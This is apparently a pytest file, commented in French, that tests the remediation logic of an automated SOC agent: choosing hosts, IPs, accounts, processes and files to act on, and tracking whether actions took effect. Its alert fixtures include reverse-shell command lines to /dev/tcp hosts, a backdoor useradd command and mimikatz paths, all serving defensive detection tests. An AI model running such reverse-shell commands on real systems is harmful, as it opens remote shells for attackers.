"""Logique pure de la remédiation (sans Shuffle, Wazuh ni IRIS)."""

import ipaddress
import json

from soc_agent import iris as _iris_mod
from soc_agent import mitigate
from soc_agent.mitigate import (REMEDIATIONS, REVERTERS, _targets_by_machine,
                                _created_accounts, _task_desc, _interpret,
                                _is_private_ip, _canceled_tasks)

# NETWORKS_INTERNAL est vide par défaut (aucun parc de test) : les cas qui
# testent l'exclusion « IP du parc » doivent déclarer un subnet explicitement.
_TEST_NETWORK = [ipaddress.ip_network("192.168.10.0/24")]


def _alert_proctitle(cmd: str, agent_id: str = "001") -> dict:
    """Alerte auditd portant `cmd` dans son proctitle hex (args nul-séparés)."""
    hexp = cmd.replace(" ", "\x00").encode().hex()
    return {"agent_id": agent_id, "srcip": None, "srcuser": None, "entity": None,
            "raw": json.dumps({"full_log": f"type=PROCTITLE proctitle={hexp}"})}


def test_comptes_crees_extrait_backdoor_du_proctitle():
    """Le compte créé par useradd est capté depuis le proctitle auditd (niv. 3),
    sans l'alerte syslog 5902 — c'est ce qui permet de bloquer le backdoor sans
    monter le niveau de l'alerte d'ajout d'utilisateur."""
    al = [_alert_proctitle("useradd -m -s /bin/bash svcbackup")]
    assert _created_accounts(al) == ["svcbackup"]
    # …et devient une cible de désactivation, sur la machine où il apparaît.
    targets = _targets_by_machine("propose_disable_user", {"id": 1}, al)
    assert ("001", "svcbackup") in targets


def test_comptes_crees_exclut_comptes_proteges():
    # root / comptes système ne sont jamais des cibles de désactivation auto.
    assert _created_accounts([_alert_proctitle("useradd -m root")]) == []


def test_interpreter_etat_isolation():
    # Marqueur présent -> isolé.
    e = _interpret('{"isolated": true, "since": "x"}', 0)
    assert e == {"isolated": True, "reachable": True,
                 "marker": {"isolated": True, "since": "x"}}
    # Fichier absent (stdout vide, rc non nul) -> non isolé.
    assert _interpret("", 1) == {"isolated": False, "reachable": True,
                                   "marker": None}
    # Échec SSH -> état inconnu.
    assert _interpret("", 255) == {"isolated": None, "reachable": False,
                                     "marker": None}
    # Marqueur illisible mais présent -> isolé, sans détail.
    e = _interpret("corrompu", 0)
    assert e["isolated"] is True and e["marker"] is None


def test_cibles_isolation_disable_kill(monkeypatch):
    """Résolution machine par machine : chaque cible porte l'agent où la preuve
    a été observée. (Blocage d'IP testé séparément : il touche l'API assets.)"""
    monkeypatch.setattr(mitigate, "not_isolatable_reason", lambda ag: None)
    inc = {"id": 1, "agent_id": "001"}
    alerts = [
        {"agent_id": "001", "srcip": "45.134.26.87", "srcuser": "jdupont",
         "entity": None, "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": "root",
         "entity": None, "raw": "{}"},
    ]
    # Isolation vise la machine (agent, agent).
    assert _targets_by_machine("propose_isolate_host", inc, alerts) == [("001", "001")]
    # Désactivation : comptes nommés, pas les génériques (root).
    assert _targets_by_machine("propose_disable_user", inc, alerts) == [("001", "jdupont")]


def test_block_ip_exclut_parc_et_assets_et_ordonne_public_first(monkeypatch):
    """Blocage : on écarte les subnets du parc ET les IP des agents surveillés
    (victime/pivot, jamais l'attaquant — bug mesuré à un exercice purple-team),
    et on ordonne les IP publiques d'abord. On ne réduit pas : un bruteforce
    vient de N IP, toutes bloquées."""
    monkeypatch.setattr(_iris_mod, "_NETS_INTERNAL", _TEST_NETWORK)
    monkeypatch.setattr(mitigate, "_agent_ips", lambda: {"192.168.30.46"})
    inc = {"id": 1, "agent_id": "011"}
    alerts = [
        {"agent_id": "011", "srcip": "45.134.26.87", "srcuser": None,
         "entity": None, "raw": "{}"},   # attaquant, public
        {"agent_id": "011", "srcip": "192.168.10.20", "srcuser": None,
         "entity": None, "raw": "{}"},   # subnet du parc -> écarté
        {"agent_id": "011", "srcip": "192.168.30.46", "srcuser": None,
         "entity": None, "raw": "{}"},   # IP d'un agent (victime/pivot) -> écarté
        {"agent_id": "011", "srcip": "10.8.0.9", "srcuser": None,
         "entity": None, "raw": "{}"},   # C2 privé hors parc -> bloquable
    ]
    targets = _targets_by_machine("propose_block_ip", inc, alerts)
    vals = [ip for _ag, ip in targets]
    assert "192.168.10.20" not in vals          # subnet du parc
    assert "192.168.30.46" not in vals          # IP d'un agent surveillé
    assert set(vals) == {"45.134.26.87", "10.8.0.9"}
    assert vals[0] == "45.134.26.87"           # publique d'abord (ordre attaquant)


def test_block_ip_extrait_c2_du_reverse_shell(monkeypatch):
    """Le C2 d'un reverse shell /dev/tcp (execve auditd, sans srcip) devient une
    cible de blocage ; une cible /dev/tcp INTERNE (latéral) reste écartée.
    Régression mesurée : des milliers de détections, zéro blocage avant fix."""
    monkeypatch.setattr(_iris_mod, "_NETS_INTERNAL", _TEST_NETWORK)
    monkeypatch.setattr(mitigate, "_agent_ips", lambda: set())
    inc = {"id": 1, "agent_id": "011"}
    alerts = [
        {"agent_id": "011", "srcip": None, "srcuser": None, "entity": None,
         "rule_desc": "reverse shell",
         "raw": {"full_log": "bash -i >& /dev/tcp/45.9.1.2/4444 0>&1"}},   # C2 externe
        {"agent_id": "011", "srcip": None, "srcuser": None, "entity": None,
         "raw": {"full_log": "bash -i >& /dev/tcp/192.168.10.9/9001 0>&1"}},  # interne = latéral
    ]
    vals = [ip for _ag, ip in
            _targets_by_machine("propose_block_ip", inc, alerts)]
    assert "45.9.1.2" in vals          # C2 externe -> bloqué
    assert "192.168.10.9" not in vals   # cible interne -> pas bloquée


def test_ip_privee_ordonne_sans_exclure():
    # _ip_privee sert au tri, pas à l'exclusion : un C2 privé reste bloquable.
    assert _is_private_ip("10.8.0.9") is True
    assert _is_private_ip("192.168.30.46") is True
    assert _is_private_ip("45.134.26.87") is False
    assert _is_private_ip("pas-une-ip") is False


def test_cibles_kill_process_vise_implant_en_dir_suspect():
    """Kill : nom exact des exécutables lancés depuis /tmp, /dev/shm… ; jamais
    un binaire système légitime."""
    inc = {"id": 1, "agent_id": "001"}
    alerts = [
        {"agent_id": "001", "srcip": None, "srcuser": None,
         "entity": "/dev/shm/.kworker", "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": None,
         "entity": "/usr/bin/bash", "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": None, "entity": None,
         "raw": json.dumps({"data": {"audit": {"exe": "/tmp/malware"}}})},
    ]
    assert _targets_by_machine("propose_kill_process", inc, alerts) == [
        ("001", ".kworker"), ("001", "malware")]


# --- ciblage Windows (régression purple-team 2026-08-02) --------------------
#
# Les chemins de l'eventchannel Windows arrivent avec les backslashes DOUBLÉS et
# Wazuh les stocke tels quels. Le filtre des répertoires système ne matchait
# donc jamais : le soc-agent a envoyé 26 ordres de quarantaine sur des binaires
# signés de System32 d'un contrôleur de domaine, et tué toutes les sessions
# PowerShell et WinRM de la machine. Ces tests figent le comportement attendu.

def _alert_win(agent_id="014", image=None, target_file=None, pid=None,
                srcuser=None, eid="1"):
    ev = {}
    if image:
        ev["image"] = image
    if target_file:
        ev["targetFilename"] = target_file
    if pid:
        ev["processId"] = pid
    return {"agent_id": agent_id, "srcip": None, "srcuser": srcuser,
            "entity": None,
            "raw": json.dumps({"data": {"win": {"system": {"eventID": eid},
                                                "eventdata": ev}}})}


def _win(monkeypatch, agents=("014",), dcs=("014",)):
    monkeypatch.setattr(mitigate.config, "AGENTS_WINDOWS", set(agents))
    monkeypatch.setattr(mitigate.config, "AGENTS_DC", set(dcs))


def test_norm_chemin_win_deplie_les_backslashes_doubles():
    assert (mitigate._norm_win_path(r"C:\\Windows\\System32\\cmd.exe")
            == r"C:\Windows\System32\cmd.exe")
    assert mitigate._norm_win_path('"C:\\\\Temp\\\\a.exe"') == r"C:\Temp\a.exe"


def test_quarantine_epargne_system32_malgre_backslashes_doubles(monkeypatch):
    """Le cas exact du purple-team : cmd.exe et net.exe d'un DC ne doivent PAS
    être des cibles, et l'implant déposé doit le rester."""
    _win(monkeypatch)
    alerts = [
        _alert_win(image=r"C:\\Windows\\System32\\cmd.exe"),
        _alert_win(image=r"C:\\Windows\\System32\\net.exe"),
        _alert_win(image=r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        _alert_win(image=r"C:\\AtomicRedTeam\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"),
    ]
    targets = _targets_by_machine("propose_quarantine_file", {"id": 1}, alerts)
    assert targets == [("014", r"C:\AtomicRedTeam\ExternalPayloads\mimikatz\x64\mimikatz.exe")]


def test_quarantine_ignore_les_sondes_applocker(monkeypatch):
    _win(monkeypatch)
    alerts = [_alert_win(
        target_file=r"C:\\Users\\Admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_aokpwtrq.13g.ps1")]
    assert _targets_by_machine("propose_quarantine_file", {"id": 1}, alerts) == []


def test_kill_windows_refuse_image_generique_sans_pid(monkeypatch):
    """`powershell.exe` sans PID n'est pas une cible : tuer par nom couperait
    toutes les sessions d'administration et WinRM de la machine."""
    _win(monkeypatch)
    alerts = [_alert_win(image=r"C:\\Users\\Public\\powershell.exe")]
    assert _targets_by_machine("propose_kill_process", {"id": 1}, alerts) == []


def test_kill_windows_cible_pid_et_image_attendue(monkeypatch):
    _win(monkeypatch)
    alerts = [_alert_win(image=r"C:\\Users\\Public\\powershell.exe", pid="4321"),
               _alert_win(image=r"C:\\Temp\\mimikatz.exe", pid="777")]
    assert _targets_by_machine("propose_kill_process", {"id": 1}, alerts) == [
        ("014", "mimikatz.exe#777"), ("014", "powershell.exe#4321")]


def test_kill_windows_epargne_les_binaires_systeme(monkeypatch):
    _win(monkeypatch)
    alerts = [_alert_win(image=r"C:\\Windows\\System32\\net.exe", pid="1234")]
    assert _targets_by_machine("propose_kill_process", {"id": 1}, alerts) == []


def test_disable_user_windows_ignore_srcuser_des_logons(monkeypatch):
    """Le srcuser d'un 4624 est la victime ou une identité système. Seuls les
    comptes CRÉÉS par l'attaquant sont désactivables automatiquement."""
    _win(monkeypatch)
    alerts = [_alert_win(srcuser="Système"),
               _alert_win(srcuser="ANONYMOUS LOGON"),
               _alert_win(srcuser="UMFD-0"),
               _alert_win(srcuser="jdupont")]
    assert _targets_by_machine("propose_disable_user", {"id": 1}, alerts) == []


def test_disable_user_windows_garde_le_compte_cree(monkeypatch):
    """Le compte créé par l'attaquant (4720) reste une cible, et l'action part
    sur un DC — même noyée dans des logons d'identités système."""
    _win(monkeypatch)
    creation = {
        "agent_id": "014", "srcip": None, "srcuser": "Administrateur",
        "entity": None,
        "raw": json.dumps({"data": {"win": {
            "system": {"eventID": "4720"},
            "eventdata": {"targetUserName": "art-backdoor"}}}}),
    }
    al = [creation, _alert_win(srcuser="Système")]
    assert _targets_by_machine("propose_disable_user", {"id": 1}, al) == [
        ("014", "art-backdoor")]


def test_comptes_windows_bien_connus_proteges():
    for name in ("Système", "SYSTEM", "ANONYMOUS LOGON", "SERVICE LOCAL",
                "LOCAL SERVICE", "UMFD-0", "DWM-1", "LAB\\WIN-DC$"):
        assert mitigate._is_protected_account(name), name


# --- boucle de vérification des active responses ----------------------------

def test_statuts_partis_couvrent_le_cycle_de_vie():
    """« émis » n'est PAS un succès : l'API a pris la commande, rien de plus.
    Le rapport IRIS du 2026-08-02 annonçait 26 quarantaines réussies qui
    avaient toutes été refusées par le script."""
    assert set(mitigate.STATUSES_GONE) == {
        "émis", "confirmé", "sans_effet", "refusé_agent"}
    # Seul un compte rendu de l'agent vaut « Done » côté IRIS.
    assert mitigate._STATUS_TASK["confirmé"] == "Done"
    assert mitigate._STATUS_TASK["émis"] != "Done"
    assert mitigate._STATUS_TASK["refusé_agent"] == "Canceled"


def test_statut_ar_mappe_les_quatre_issues():
    assert mitigate._STATUS_AR == {"applied": "confirmé", "noop": "sans_effet",
                                   "refused": "refusé_agent", "error": "échec"}


def test_seules_les_reponses_de_l_agent_sont_figees():
    """« Parti » et « abouti » ne sont pas la même chose.

    Un refus ne se rejoue pas — il serait redécliné à chaque cycle. Un échec
    de canal, si. Et surtout `émis` NON : c'est « la commande est partie »,
    pas « elle a eu l'effet voulu ». Le figer laissait un compte attaquant
    recréé sous un incident déjà ouvert sans jamais être désactivé (mesuré à
    l'exercice : `art-backdoor` figé sur un `émis` hérité).

    Ce test affirmait l'inverse jusqu'au 2026-08-09 : il imposait que TOUT
    STATUTS_PARTIS soit figé, ce que le correctif d'`émis` a rendu faux. Il
    échouait donc depuis, en décrivant une règle que le code avait
    délibérément abandonnée.
    """
    agent_responses = {"confirmé", "sans_effet", "refusé_agent"}
    assert agent_responses <= set(mitigate._STATUSES_FROZEN)
    assert "annulé" in mitigate._STATUSES_FROZEN

    # Les deux rejouables, pour des raisons différentes.
    assert "émis" not in mitigate._STATUSES_FROZEN
    assert "échec" not in mitigate._STATUSES_FROZEN

    # `émis` reste bien un statut « parti » — c'est ce qui le distingue de
    # `dry_run`, qui n'a rien envoyé du tout.
    assert "émis" in mitigate.STATUSES_GONE
    assert "dry_run" not in mitigate.STATUSES_GONE


def test_chaque_action_remediable_a_un_script_ar():
    """Sans entrée dans _SCRIPTS_AR, le compte rendu de l'agent n'est jamais
    rapproché et la remédiation reste 'sent' pour toujours."""
    for action in REMEDIATIONS:
        if action in mitigate.MANUAL_ACTIONS:
            continue
        assert action in mitigate._SCRIPTS_AR, action


def test_open_case_et_escalade_hors_remediation():
    assert "open_case" not in REMEDIATIONS
    assert "close_false_positive" not in REMEDIATIONS
    assert "escalate_human" not in REMEDIATIONS


def test_taches_annulees_ne_garde_que_canceled():
    """Réconciliation : seules les tâches en 'Canceled' déclenchent un reverse."""
    tasks = [
        {"task_id": 1, "status_name": "Done"},
        {"task_id": 2, "status_name": "Canceled"},
        {"task_id": 3, "status_name": "To do"},
        {"task_id": 4, "status_name": "Canceled"},
    ]
    assert _canceled_tasks(tasks) == {2, 4}
    assert _canceled_tasks([]) == set()
    assert _canceled_tasks(None) == set()


def test_reverse_pour_actions_reversibles_pas_pour_kill():
    """Isolation, blocage IP, désactivation et quarantaine ont un reverse ; le
    kill non (un process tué ne se « unkill » pas)."""
    assert set(REVERTERS) == {"propose_isolate_host", "propose_block_ip",
                               "propose_disable_user", "propose_quarantine_file"}
    assert "propose_kill_process" not in REVERTERS


def test_desc_tache_contient_quoi_pourquoi_annulation():
    triage = {"verdict": "true_positive", "confidence": "high",
              "reason": "Ransomware en cours."}
    desc = _task_desc(triage, "001", "exécuté", "Shuffle",
                       "Isolation nftables.", "curl ... !host-unisolate.sh")
    assert "Ce qui a été fait" in desc
    assert "Pourquoi" in desc and "Ransomware en cours." in desc
    assert "Comment annuler" in desc and "unisolate" in desc
    assert "**Statut** : exécuté" in desc
